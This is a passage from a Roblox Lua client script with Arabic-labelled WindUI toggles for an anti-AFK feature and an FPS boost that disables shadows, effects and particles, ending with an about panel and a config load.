            AntiAFKConnection = nil
        end
    end
end

SafeElement("Anti-AFK Toggle", function()
    UtilitySection:Toggle({
       Flag = "AntiAFKToggle",
       Title = "Anti-AFK (منع الطرد بسبب الخمول)",
       Icon = "coffee",
       Value = false,
       Callback = function(state)
           ToggleAntiAFK(state)
           Window.CurrentConfig:Save()
       end,
    })
end)

local FPSBoostEnabled = false
local OriginalQualityLevel = nil
local OriginalGlobalShadows = nil
local CachedEffects = {}
local CachedParticles = {}

local function ApplyFPSBoost()
    pcall(function()
        local settingsService = UserSettings():GetService("UserGameSettings")
        OriginalQualityLevel = settingsService.SavedQualityLevel
        settingsService.SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
    end)

    OriginalGlobalShadows = Lighting.GlobalShadows
    Lighting.GlobalShadows = false

    for _, effect in ipairs(Lighting:GetChildren()) do
        if effect:IsA("PostEffect") then
            CachedEffects[effect] = effect.Enabled
            effect.Enabled = false
        end
    end

    for _, item in ipairs(workspace:GetDescendants()) do
        if item:IsA("ParticleEmitter") or item:IsA("Trail") or item:IsA("Beam") then
            CachedParticles[item] = item.Enabled
            item.Enabled = false
        end
    end
end

local function RevertFPSBoost()
    pcall(function()
        if OriginalQualityLevel then
            UserSettings():GetService("UserGameSettings").SavedQualityLevel = OriginalQualityLevel
        end
    end)

    if OriginalGlobalShadows ~= nil then
        Lighting.GlobalShadows = OriginalGlobalShadows
    end

    for effect, wasEnabled in pairs(CachedEffects) do
        if effect and effect.Parent then
            effect.Enabled = wasEnabled
        end
    end
    CachedEffects = {}

    for item, wasEnabled in pairs(CachedParticles) do
        if item and item.Parent then
            item.Enabled = wasEnabled
        end
    end
    CachedParticles = {}
end

local function ToggleFPSBoost(Value)
    FPSBoostEnabled = Value
    if FPSBoostEnabled then
        ApplyFPSBoost()
    else
        RevertFPSBoost()
    end
end

SafeElement("FPS Boost Toggle", function()
    UtilitySection:Toggle({
       Flag = "FPSBoostToggle",
       Title = "FPS Boost (تحسين الأداء)",
       Desc = "يقلل الإضاءة والتأثيرات والجسيمات لتحسين الفريمات",
       Icon = "zap",
       Value = false,
       Callback = function(state)
           ToggleFPSBoost(state)
           Window.CurrentConfig:Save()
       end,
    })
end)

SafeElement("About Paragraph", function()
    ExtraTab:Space()
    ExtraTab:Paragraph({
       Title = "Anti-Fling System",
       Desc = "By Jksu — تأكد إنك تحدث WindUI لأحدث نسخة لأفضل استقرار",
       Icon = "info",
    })
end)

-- ==================== حفظ وتحميل الإعدادات ====================
SafeElement("Config Load", function()
    local ConfigManager = Window.ConfigManager
    Window.CurrentConfig = ConfigManager:CreateConfig("AntiFlingConfig")
    Window.CurrentConfig:Load()
end)
end) 
